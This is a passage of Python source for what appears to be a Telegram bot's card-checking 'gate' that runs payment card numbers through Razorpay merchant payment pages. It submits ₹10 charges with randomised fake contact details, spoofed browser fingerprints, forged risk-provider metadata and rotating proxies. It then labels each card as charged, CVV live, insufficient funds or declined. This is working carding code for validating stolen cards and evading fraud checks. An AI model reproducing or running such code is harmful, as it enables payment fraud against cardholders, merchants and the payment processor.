import hashlib
import secrets
import base64
import string
from urllib.parse import quote

# Razorpay URLs - rotated round-robin per card
RAZORPAY_URLS = [
    'https://pages.razorpay.com/avadale',
    'https://pages.razorpay.com/Gift2DS',
    'https://pages.razorpay.com/pl_C0rYjVEXmkqYVC/view',
    'https://pages.razorpay.com/paytomitzvahLtd',
]
RAZORPAY_BUILD = '9cb57fdf457e44eac4384e182f925070ff5488d9'
RAZORPAY_BUILD_V1 = '715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2'
RAZORPAY_AMOUNT = 1000  # ₹10 in paise

# Global index for URL rotation
_razorpay_url_index = 0

def _get_next_razorpay_url():
    """Get next Razorpay URL in round-robin rotation"""
    global _razorpay_url_index
    url = RAZORPAY_URLS[_razorpay_url_index % len(RAZORPAY_URLS)]
    _razorpay_url_index += 1
    return url

def _gen_razorpay_ua():
    """Generate random User-Agent for Razorpay"""
    major = 120 + random.randint(0, 13)
    build = 6000 + random.randint(0, 1200)
    patch = 50 + random.randint(0, 200)
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36'

def _gen_razorpay_phone():
    """Generate random Indian phone number"""
    first = random.choice(['6', '7', '8', '9'])
    rest = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return '+91' + first + rest

def _gen_razorpay_email():
    """Generate random email"""
    names = ['alex', 'john', 'mike', 'sara', 'david', 'emma', 'james', 'lisa']
    return f"{random.choice(names)}{random.randint(100, 9999)}@gmail.com"

def _get_razorpay_brand(cc):
    """Get card brand from first digits"""
    if cc.startswith('4'):
        return 'visa'
    if cc[:2] in ('51', '52', '53', '54', '55'):
        return 'mastercard'
    if cc[:2] in ('34', '37'):
        return 'amex'
    if cc.startswith('6011') or cc.startswith('65'):
        return 'discover'
    return 'unknown'

def _find_between_razorpay(text, start, end):
    """Find text between two strings"""
    si = text.find(start)
    if si == -1:
        return ''
    ei = text.find(end, si + len(start))
    if ei == -1:
        return ''
    return text[si + len(start):ei]

def _format_razorpay_proxy(raw):
    """Format proxy for Razorpay"""
    if not raw:
        return None
    raw = raw.strip()
    if '://' in raw:
        return raw
    parts = raw.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    if len(parts) == 2:
        return f'http://{raw}'
    return None

# ============ RAZORPAY GATEWAY FROM gate2.js (FIXED) ============

async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int = None) -> Dict:
    """
    Check card using Razorpay gate2 (from gate2.js) - FIXED to capture actual responses
    Uses direct Razorpay page integration with Chrome 136 profile
    """
    print(f"\n{'='*80}")
    print(f"💳 [RAZORPAY GATE2] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "₹10",
        "gateway": "Razorpay"
    }
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        cc, mm, yy, cvv = parts
        yy_2 = yy[-2:] if len(yy) == 4 else yy
        year = int(f'20{yy_2}')
        brand = _get_razorpay_brand(cc)
        
        # ============ CHROME 136 PROFILE ============
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        
        phone = _gen_razorpay_phone()
        phone_short = phone[3:]
        email = _gen_razorpay_email()
        
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        BASE62 = string.ascii_letters + string.digits
        rzp_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
        
        RAZORPAY_URL = _get_next_razorpay_url()
        page_origin = 'https://razorpay.me' if 'razorpay.me' in RAZORPAY_URL else 'https://pages.razorpay.com'
        
        # Setup client with proxy
        proxy_url = _format_razorpay_proxy(proxy) if proxy else None
        client_kwargs = {
            'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
            'verify': False,
            'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
            'follow_redirects': True
        }
        if proxy_url:
            client_kwargs['proxy'] = proxy_url
        
        async with httpx.AsyncClient(**client_kwargs) as client:
            # Step 1: Fetch payment page with Chrome 136 headers
            print(f"\n📡 [STEP 1] Fetching payment page: {RAZORPAY_URL}")
            start_time = time.time()
            
            r1 = await client.get(RAZORPAY_URL, headers={
                'User-Agent': ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
            })
            
            if r1.status_code != 200:
                return {
                    "status": "error",
                    "result": "PAGE_FETCH_FAILED",
                    "message": f"Failed to fetch page: HTTP {r1.status_code}",
                    "status_display": "⚠️ PAGE ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            html = r1.text
            
            # Step 2: Parse page data
            print(f"📡 [STEP 2] Parsing page data...")
            dm_match = re.search(r'var data = ({[\s\S]*?});', html)
            if not dm_match:
                return {
                    "status": "error",
                    "result": "PARSE_FAILED",
                    "message": "Failed to parse Razorpay page data",
                    "status_display": "⚠️ PARSE ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            d = json.loads(dm_match.group(1))
            kyid = d.get('key_id', '')
            plink = d.get('payment_link', {}).get('id')
            ppid = d.get('payment_link', {}).get('payment_page_items', [{}])[0].get('id')
            kh = d.get('keyless_header', '')
            
            if not plink or not ppid:
                return {
                    "status": "error",
                    "result": "MISSING_FIELDS",
                    "message": "Missing required page fields",
                    "status_display": "⚠️ MISSING DATA",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            print(f"✅ Payment link: {plink}, Page item: {ppid}")
            
            # Step 3: Create order with Chrome 136 headers
            print(f"📡 [STEP 3] Creating order...")
            r2 = await client.post(
                f'https://api.razorpay.com/v1/payment_pages/{plink}/order',
                json={
                    'notes': {'comment': '', 'name': 'User'},
                    'line_items': [{'payment_page_item_id': ppid, 'amount': RAZORPAY_AMOUNT}]
                },
                headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin': page_origin,
                    'Referer': RAZORPAY_URL + '/',
                    'User-Agent': ua,
                    'sec-ch-ua': '"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
            )
            
            if r2.status_code != 200:
                return {
                    "status": "error",
                    "result": "ORDER_FAILED",
                    "message": f"Order creation failed: HTTP {r2.status_code}",
                    "status_display": "⚠️ ORDER ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            od = r2.json()
            if not od.get('order'):
                return {
                    "status": "error",
                    "result": "ORDER_FAILED",
                    "message": "Order creation failed - no order data",
                    "status_display": "⚠️ ORDER ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            order_id = od['order']['id']
            checkout_id = order_id.split('_')[1]
            print(f"✅ Order created: {order_id}")
            
            # Step 4: Get session token with Chrome 136
            print(f"📡 [STEP 4] Getting session token...")
            r3 = await client.get(
                'https://api.razorpay.com/v1/checkout/public',
                params={
                    'traffic_env': 'production',
                    'build': RAZORPAY_BUILD,
                    'build_v1': RAZORPAY_BUILD_V1,
                    'checkout_v2': '1',
                    'new_session': '1',
                    'keyless_header': kh,
                    'rzp_device_id': rzp_device_id,
                    'unified_session_id': rzp_session_id,
                },
                headers={
                    'Accept': 'text/html,application/xhtml+xml,*/*',
                    'Referer': RAZORPAY_URL + '/',
                    'User-Agent': ua,
                    'sec-ch-ua': '"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
            )
            
            sessid = _find_between_razorpay(r3.text, 'window.session_token="', '";')
            if not sessid:
                m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3.text)
                if m:
                    sessid = m.group(1)
            
            if not sessid:
                return {
                    "status": "error",
                    "result": "SESSION_FAILED",
                    "message": "Session token not found",
                    "status_display": "⚠️ SESSION ERROR",
                    "status_category": "error",
                    "elapsed": time.time() - start_time
                }
            
            print(f"✅ Session token obtained")
            
            rzp_ref = (f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
                      f"&build={RAZORPAY_BUILD}&build_v1={RAZORPAY_BUILD_V1}&checkout_v2=1&new_session=1"
                      f"&unified_session_id={rzp_session_id}&session_token={sessid}")
            
            api_headers = {
                'Accept': '*/*',
                'Content-type': 'application/x-www-form-urlencoded',
                'Origin': 'https://api.razorpay.com',
                'Referer': rzp_ref,
                'User-Agent': ua,
                'x-session-token': sessid,
            }
            
            # Step 5: Preferences (fire-and-forget)
            print(f"📡 [STEP 5] Setting preferences...")
            try:
                await client.post(
                    'https://api.razorpay.com/v2/standard_checkout/preferences',
                    params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': kh},
                    headers={**api_headers, 'Content-type': 'application/json'},
                    json={
                        'query': [{'resource': r} for r in [
                            'checkout_version_config', 'merchant', 'merchant_features', 'downtime',
                            'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments',
                            'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization'
                        ]],
                        'query_params': {
                            'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': RAZORPAY_AMOUNT,
                            'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                            'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                            'order_id': order_id, 'payment_link_id': plink, 'contact': phone,
                        },
                        'action': 'get',
                    },
                    timeout=20
                )
            except:
                pass
            
            # Step 6: Checkout order
            print(f"📡 [STEP 6] Checkout order...")
            try:
                r5 = await client.post(
                    'https://api.razorpay.com/v1/standard_checkout/checkout/order',
                    params={'key_id': kyid, 'session_token': sessid, 'keyless_header': kh},
                    headers=api_headers,
                    data={
                        'notes[email]': email,
                        'notes[phone]': phone_short,
                        'payment_link_id': plink,
                        'key_id': kyid,
                        'contact': phone,
                        'email': email,
                        'currency': 'INR',
                        '_[integration]': 'payment_pages',
                        '_[device.id]': rzp_device_id,
                        '_[library]': 'checkoutjs',
                        '_[library_src]': 'no-src',
                        '_[current_script_src]': 'no-src',
                        '_[platform]': 'browser',
                        '_[env]': '',
                        '_[is_magic_script]': 'false',
                        '_[os]': 'windows',
                        '_[shield][fhash]': h,
                        '_[shield][tz]': '0',
                        '_[device_id]': rzp_device_id,
                        '_[build]': RAZORPAY_BUILD,
                        '_[shield][os]': 'windows',
                        '_[shield][platform]': 'browser',
                        '_[shield][browser]': 'chrome',
                        '_[request_index]': '0',
                        'amount': str(RAZORPAY_AMOUNT),
                        'order_id': order_id,
                        'method': 'card',
                        'checkout_id': checkout_id,
                    },
                    timeout=30
                )
                print(f"   Checkout response status: {r5.status_code}")
                if r5.status_code == 200:
                    try:
                        r5_data = r5.json()
                        coid_local = r5_data.get('checkout_id', checkout_id)
                        print(f"   Checkout response: {json.dumps(r5_data, indent=2)[:200]}")
                    except:
                        coid_local = checkout_id
                else:
                    coid_local = checkout_id
                    print(f"   Checkout failed: HTTP {r5.status_code}")
                    if r5.text:
                        print(f"   Response: {r5.text[:200]}")
            except Exception as e:
                print(f"   Checkout error: {e}")
                coid_local = checkout_id
            
            # Step 7: CB flows (fire-and-forget)
            print(f"📡 [STEP 7] CB flows...")
            try:
                sardine = base64.b64encode(json.dumps([{
                    "name": "sardine",
                    "metadata": {
                        "session_id": coid_local,
                        "user_agent": ua,
                        "screen_width": random.choice([1920, 1366, 1536, 1440]),
                        "screen_height": random.choice([1080, 768, 864, 900]),
                        "timezone_offset": random.choice([0, -60, -120, -180, -240, -300, -330, -360, 60, 120, 180, 330]),
                        "language": "en-US",
                        "platform": "Win32",
                        "cookie_enabled": True,
                        "java_enabled": False,
                    }
                }], separators=(',', ':')).encode()).decode()
                
                await client.post(
                    f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={quote(kh)}",
                    headers={**api_headers, 'content-type': 'application/json'},
                    json={
                        'identifiers': {
                            'merchant': {'country': 'IN'},
                            'card': {'country': 'US', 'dcc_blacklist': False, 'network': brand},
                            'method': 'card',
                            'payment_currency': 'INR'
                        },
                        'forex_charges': {'amount': RAZORPAY_AMOUNT, 'currency': 'INR', 'filters': {'method': 'card'}}
                    },
                    timeout=20
                )
            except Exception as e:
                print(f"   CB flows error: {e}")
            
            # Step 8: Create payment
            print(f"🔥 [STEP 8] Creating payment...")
            r7 = await client.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': kh},
                headers=api_headers,
                data={
                    'user_risk_providers_token': sardine,
                    'notes[comment]': '',
                    'notes[email]': email,
                    'notes[phone]': phone_short,
                    'notes[name]': 'User',
                    'payment_link_id': plink,
                    'key_id': kyid,
                    'contact': phone,
                    'email': email,
                    'currency': 'INR',
                    '_[integration]': 'payment_pages',
                    '_[checkout_id]': coid_local,
                    '_[device.id]': rzp_device_id,
                    '_[env]': '',
                    '_[library]': 'checkoutjs',
                    '_[library_src]': 'no-src',
                    '_[current_script_src]': 'no-src',
                    '_[is_magic_script]': 'false',
                    '_[platform]': 'browser',
                    '_[referer]': RAZORPAY_URL,
                    '_[shield][fhash]': h,
                    '_[shield][tz]': str(random.choice([0, -60, -120, -180, -240, -300, -330, -360])),
                    '_[device_id]': rzp_device_id,
                    '_[build]': RAZORPAY_BUILD,
                    '_[shield][os]': 'windows',
                    '_[shield][platform]': 'browser',
                    '_[shield][browser]': 'chrome',
                    '_[request_index]': '1',
                    '_[shield][screen_width]': str(random.choice([1920, 1366, 1536, 1440, 1280, 2560])),
                    '_[shield][screen_height]': str(random.choice([1080, 768, 864, 900, 720, 1440])),
                    '_[shield][color_depth]': str(random.choice([24, 32])),
                    '_[shield][language]': 'en-US',
                    'amount': str(RAZORPAY_AMOUNT),
                    'order_id': order_id,
                    'method': 'card',
                    'card[number]': cc,
                    'card[cvv]': cvv,
                    'card[name]': 'User',
                    'card[expiry_month]': mm,
                    'card[expiry_year]': str(year),
                    'save': '0',
                    'dcc_currency': 'INR',
                },
                timeout=30
            )
            
            print(f"📥 Payment response status: {r7.status_code}")
            print(f"📥 Payment response: {r7.text[:500]}")
            
            r7_data = {}
            try:
                r7_data = r7.json()
                print(f"📥 Parsed JSON: {json.dumps(r7_data, indent=2)[:500]}")
            except:
                print(f"📥 Not JSON or parse error")
            
            payment_id = r7_data.get('payment_id') or r7_data.get('id')
            if not payment_id:
                payment_id = r7_data.get('error', {}).get('metadata', {}).get('payment_id')
            
            # Check for error response
            if r7_data.get('error'):
                error_data = r7_data['error']
                error_desc = error_data.get('description', '')
                error_code = error_data.get('code', '')
                error_reason = error_data.get('reason', '')
                print(f"❌ Payment error: {error_code} - {error_desc} - {error_reason}")
                
                # Parse error for live card indicators
                error_upper = f"{error_desc} {error_code} {error_reason}".upper()
                
                if 'CARD_DECLINED' in error_upper or 'DECLINED' in error_upper:
                    return {
                        "status": "declined",
                        "result": "CARD_DECLINED",
                        "message": error_desc or "Card was declined by the bank",
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": time.time() - start_time,
                        "price": "₹10",
                        "gateway": "Razorpay"
                    }
                elif 'INSUFFICIENT' in error_upper or 'FUNDS' in error_upper:
                    return {
                        "status": "success",
                        "result": "INSUFFICIENT_FUNDS",
                        "message": f"Insufficient funds: {error_desc}",
                        "status_display": "💰 INSUFFICIENT FUNDS",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": "₹10",
                        "gateway": "Razorpay"
                    }
                elif 'CVV' in error_upper or 'SECURITY' in error_upper or 'CVC' in error_upper:
                    return {
                        "status": "success",
                        "result": "CVV_LIVE",
                        "message": f"CVV verification failed: {error_desc}",
                        "status_display": "✅ CVV LIVE",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": "₹10",
                        "gateway": "Razorpay"
                    }
                elif '3D' in error_upper or 'SECURE' in error_upper or 'AUTHENTICATION' in error_upper:
                    return {
                        "status": "success",
                        "result": "3D_REQUIRED",
                        "message": f"3D Secure required: {error_desc}",
                        "status_display": "🔐 3D REQUIRED",
                        "status_category": "approved",
                        "elapsed": time.time() - start_time,
                        "price": "₹10",
                        "gateway": "Razorpay"
                    }
                else:
                    return {
                        "status": "declined",
                        "result": "DECLINED",
                        "message": error_desc or error_reason or "Payment declined",
                        "status_display": "❌ DECLINED",
                        "status_category": "declined",
                        "elapsed": time.time() - start_time,
                        "price": "₹10",
                        "gateway": "Razorpay"
                    }
            
            
            
            if not payment_id:
                return {
                    "status": "declined",
                    "result": "PAYMENT_FAILED",
                    "message": "Payment ID not found",
                    "status_display": "❌ DECLINED",
                    "status_category": "declined",
                    "elapsed": time.time() - start_time,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            
            # Step 9: 3DS authenticate (fire-and-forget)
            print(f"📡 [STEP 9] 3DS authentication...")
            pid_clean = payment_id.split('_')[1]
            hdrs_3ds = {
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': ua,
            }
            try:
                await client.post(f'https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate', headers=hdrs_3ds, timeout=20)
                await asyncio.sleep(0.9 + random.random() * 0.6)
                await client.post(
                    f'https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate',
                    headers=hdrs_3ds,
                    data={
                        'browser[java_enabled]': 'false',
                        'browser[javascript_enabled]': 'true',
                        'browser[timezone_offset]': '0',
                        'browser[color_depth]': '24',
                        'browser[screen_width]': '1920',
                        'browser[screen_height]': '1080',
                        'browser[language]': 'en-US',
                        'auth_step': '3ds2Auth',
                    },
                    timeout=20
                )
            except Exception as e:
                print(f"   3DS error: {e}")
            
            # Step 10: Final cancel / result
            print(f"📡 [STEP 10] Getting final result...")
            r9 = await client.get(
                f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
                params={'key_id': kyid, 'session_token': sessid, 'keyless_header': kh},
                headers=api_headers,
                timeout=30
            )
            
            elapsed = time.time() - start_time
            print(f"📥 Final response status: {r9.status_code}")
            print(f"📥 Final response: {r9.text[:500]}")
            
            final_data = {}
            try:
                final_data = r9.json()
                print(f"📥 Final JSON: {json.dumps(final_data, indent=2)[:500]}")
            except:
                pass
            
            final_text = r9.text
            
            # Check for successful charge
            if 'razorpay_payment_id' in final_text:
                return {
                    "status": "success",
                    "result": "CHARGED",
                    "message": f"Charged ₹10 | {final_data.get('razorpay_payment_id', payment_id)}",
                    "status_display": "🔥 CHARGED 🔥",
                    "status_category": "charged",
                    "elapsed": elapsed,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            
            # Parse error from final response
            err = final_data.get('error', {})
            desc = err.get('description', '')
            code = err.get('code', '')
            reason = err.get('reason', '')
            field = err.get('field', '')
            
            # Also check for error in response text
            if not desc and 'error' in final_text.lower():
                error_match = re.search(r'"description":"([^"]+)"', final_text)
                if error_match:
                    desc = error_match.group(1)
                code_match = re.search(r'"code":"([^"]+)"', final_text)
                if code_match:
                    code = code_match.group(1)
            
            desc = desc.replace(' Try another payment method or contact your bank for details.', '').strip()
            full_message = f"{desc} ({code})" if code else desc
            if not full_message:
                full_message = "Unknown Decline"
            
            error_upper = f"{desc} {code} {reason}".upper()
            
            print(f"📊 Final error analysis: desc='{desc}', code='{code}', reason='{reason}'")
            
            # Check for live card indicators
            if any(k in error_upper for k in ['INSUFFICIENT', 'FUNDS', 'BALANCE']):
                return {
                    "status": "success",
                    "result": "INSUFFICIENT_FUNDS",
                    "message": f"Insufficient funds: {desc}",
                    "status_display": "💰 INSUFFICIENT FUNDS",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            
            if any(k in error_upper for k in ['CVV', 'CVC', 'SECURITY CODE', 'INCORRECT_CVV']):
                return {
                    "status": "success",
                    "result": "CVV_LIVE",
                    "message": f"CVV verification failed: {desc}",
                    "status_display": "✅ CVV LIVE",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            
            if any(k in error_upper for k in ['3D', '3DS', 'SECURE', 'AUTHENTICATION', 'OTP']):
                return {
                    "status": "success",
                    "result": "3D_REQUIRED",
                    "message": f"3D Secure required: {desc}",
                    "status_display": "🔐 3D REQUIRED",
                    "status_category": "approved",
                    "elapsed": elapsed,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            if 'risk' in error_upper or 'payment_risk_check_failed' in reason:
                return {
                    "status": "declined",
                    "result": "RISK_DECLINED",
                    "message": f"Payment declined ({reason})" if reason else "Payment declined (risk check failed)",
                    "reason": reason, 
                    "status_display": "❌ DECLINED",
                    "status_category": "declined",
                    "elapsed": elapsed,
                    "price": "₹10",
                    "gateway": "Razorpay"
                }
            
            return {
                "status": "declined",
                "result": "DECLINED",
                "message": full_message,
                "reason": reason,
                "status_display": "❌ DECLINED",
                "status_category": "declined",
                "elapsed": elapsed,
                "price": "₹10",
                "gateway": "Razorpay"
            }
            

            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        default_result["message"] = str(e)[:100]
        return default_result


def format_razorpay_gate2_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Razorpay gate2 response for display with Premium emojis"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Razorpay")
    reason = result.get("reason", "")  # Get the reason field
    
    # Parse card for display
    card_parts = card.split('|')
    card_num = card_parts[0] if len(card_parts) > 0 else card
    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
    
    # Clean message - use reason if available
    if reason and "payment_risk_check_failed" in reason:
        clean_message = "Payment declined (payment_risk_check_failed)"
    elif reason and "risk" in reason.lower():
        clean_message = f"Payment declined ({reason})"
    elif "INSUFFICIENT" in message.upper():
        clean_message = "Insufficient funds - Card is live but has no balance"
    elif "CVV" in message.upper() or "cvv" in message.lower():
        clean_message = "CVV verification failed - Card is valid"
    elif "3D" in message.upper() or "3ds" in message.lower():
        clean_message = "3D Secure required - Authentication needed"
    else:
        clean_message = message[:80]
    
    # Format country with flag
    country_name = country.replace('🌐', '').strip()
    
    # Simple flag mapping
    flag_map = {
        'UNITED STATES': '🇺🇸', 'USA': '🇺🇸',
        'UNITED KINGDOM': '🇬🇧', 'UK': '🇬🇧',
        'CANADA': '🇨🇦',
        'AUSTRALIA': '🇦🇺',
        'INDIA': '🇮🇳',
        'UAE': '🇦🇪',
        'SINGAPORE': '🇸🇬',
        'MALAYSIA': '🇲🇾',
        'THAILAND': '🇹🇭',
        'PHILIPPINES': '🇵🇭',
    }
    country_flag = "🌍"
    for key, flag in flag_map.items():
        if key in country_name.upper():
            country_flag = flag
            break
    
    # Format bank name
    bank_display = bank if bank != 'N/A' else "Unknown"
    if len(bank_display) > 25:
        bank_display = bank_display[:22] + "..."
    
    # Premium emojis based on status
    if status_category == "charged":
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_text = "CHARGED"
    elif status_category == "approved":
        if "INSUFFICIENT" in message.upper():
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
            status_text = "INSUFFICIENT FUNDS"
        elif "CVV" in message.upper() or "cvv" in message.lower():
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            status_text = "CVV LIVE"
        elif "3D" in message.upper() or "3ds" in message.lower():
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
            status_text = "3D REQUIRED"
        else:
            status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
            status_text = "APPROVED"
    else:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_text = "DECLINED"
    
    # Build output with Premium emojis
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_text}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ {card_num}|{exp_month}|{exp_year_short}|{cvv}\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ ₹10\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣  {country_name}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


def get_chrome136_headers(referer: str = None, origin: str = None) -> dict:
    """Get Chrome 136 browser headers for Razorpay requests"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
    }
    
    if referer:
        headers['Referer'] = referer
    if origin:
        headers['Origin'] = origin
    
    return headers


def get_chrome136_api_headers(session_token: str = None, referer: str = None) -> dict:
    """Get Chrome 136 API headers for Razorpay API calls"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
    }
    
    if session_token:
        headers['x-session-token'] = session_token
    if referer:
        headers['Referer'] = referer
    
    return headers

def _get_next_razorpay_url():
    """Get next Razorpay URL in round-robin rotation"""
    global _razorpay_url_index
    url = RAZORPAY_URLS[_razorpay_url_index % len(RAZORPAY_URLS)]
    _razorpay_url_index += 1
    
    # Log Chrome 136 profile usage
    print(f"🌐 [Chrome 136] Fetching: {url}")
    return url

# ============ RAZORPAY GATE2 SINGLE CHECK ============
@check_gateway("razorpay")
async def single_check_razorpay_gate2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Razorpay gate2 - /rp <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Razorpay Gate2 Single Check</b>\n\n"
            "Usage: <code>/rp &lt;card&gt;</code>\n"
            "Example: <code>/rp 4111111111111111|12|2028|123</code>\n\n"
            "💰 Amount: ₹10\n"
            "📍 Gateway: Razorpay (Direct Integration)\n"
            "🔐 Checks: CVV Live, Insufficient Funds, Charged",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    card_text = " ".join(context.args).strip()
    
    # Extract card
    card = card_formatter.extract_single_card_from_text(card_text)
    if not card:
        await message.reply_text(
            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
            "Example: 4111111111111111|12|2028|123"
        )
        return
    
    # Check credits
